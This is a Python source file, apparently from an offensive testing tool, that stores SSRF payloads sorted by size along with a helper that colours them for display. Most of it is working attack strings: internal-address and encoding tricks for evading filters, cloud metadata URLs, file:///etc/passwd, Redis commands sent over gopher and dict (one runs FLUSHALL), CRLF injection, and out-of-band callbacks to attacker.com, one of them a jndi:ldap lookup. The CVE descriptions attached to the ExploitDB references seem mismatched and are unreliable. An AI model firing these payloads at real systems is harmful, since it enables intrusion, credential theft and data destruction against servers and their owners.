from colors import Colors

class SSRFPayloads:
    """Advanced SSRF payloads with WAF bypass techniques"""
    
    PAYLOADS = {
        "small": {
            "basic": [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/"
            ],
            "redirect": [
                "http://evil.com/redirect.php?url=localhost",
                "http://attacker.com/redirect?target=127.0.0.1"
            ]
        },
        "medium": {
            "basic": [
                "http://[::1]",
                "http://0.0.0.0",
                "http://2130706433",  # 127.0.0.1 in decimal
                "http://0177.0.0.1",  # 127.0.0.1 in octal
                "http://0x7f.0x0.0x0.0x1",  # 127.0.0.1 in hex
                "http://127.1",
                "http://127.0.1"
            ],
            "protocols": [
                "dict://localhost:11211/stat",
                "gopher://localhost:6379/_INFO%0D%0A",
                "file:///etc/passwd",
                "ldap://localhost:389",
                "tftp://localhost:69/TESTUDPPACKET"
            ],
            "encoding": [
                "http://loc%61lhost",  # URL encoding
                "http://127.0.0.1%23.example.com",  # Fragment bypass
                "http://127.0.0.1:80@example.com",
                "http://127.0.0.1:80%20@example.com",
                "http://127.0.0.1%20.example.com"
            ],
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.nic.svc.cluster.local/"
            ]
        },
        "large": {
            "advanced": [
                "http://127.0.0.1:80/%0D%0AHost:%20google.com",  # CRLF injection
                "http://127.0.0.1:80/?url=//google.com",
                "http://127.0.0.1:80/\tgoogle.com",  # Tab bypass
                "http://127.0.0.1:80/.google.com",
                "http://127.0.0.1:80/google.com",
                "http://127.0.0.1:80//google.com",
                "http://127.0.0.1:80/v1.0/%%32%66%%32%66%%32%66%%32%66@google.com"  # Double encoding
            ],
            "oob": [
                "http://${jndi:ldap://attacker.com/a}",
                "http://attacker.com/ssrf?token=${ssrf_token}",
                "http://x${inject}example.com"
            ],
            "graphql": [
                '{"query":"mutation { updateUser(input: {id: 1, profileImage: \"http://localhost/admin\"}) }"}',
                '{"query":"{ user(id: 1) { profileImage(url: \"dict://localhost:6379/FLUSHALL\") } }"}'
            ],
            "headers": [
                {"X-Forwarded-For": "127.0.0.1"},
                {"X-Real-IP": "localhost"},
                {"X-Custom-IP-Authorization": "127.0.0.1"},
                {"Host": "localhost"}
            ]
        }
    }

    EXPLOITDB_REFERENCES = {
        "CVE-2021-29425": {
            "description": "WordPress XXE to SSRF via Media Library",
            "url": "https://www.exploit-db.com/exploits/50100"
        },
        "CVE-2020-9484": {
            "description": "Apache Tomcat SSRF via JMX",
            "url": "https://www.exploit-db.com/exploits/48545"
        }
    }

    @classmethod
    def get_payloads(cls, size="medium"):
        """Get payloads by size with color formatting"""
        payloads = cls.PAYLOADS.get(size.lower(), cls.PAYLOADS["medium"])
        colored_payloads = {}
        
        for category, items in payloads.items():
            if isinstance(items, list):
                colored_payloads[Colors.info(category)] = [Colors.subtle(item) for item in items]
            elif isinstance(items, dict):  # For header payloads
                colored_items = {}
                for k, v in items.items():
                    colored_items[Colors.info(k)] = Colors.subtle(v)
                colored_payloads[Colors.info(category)] = colored_items
                
        return colored_payloads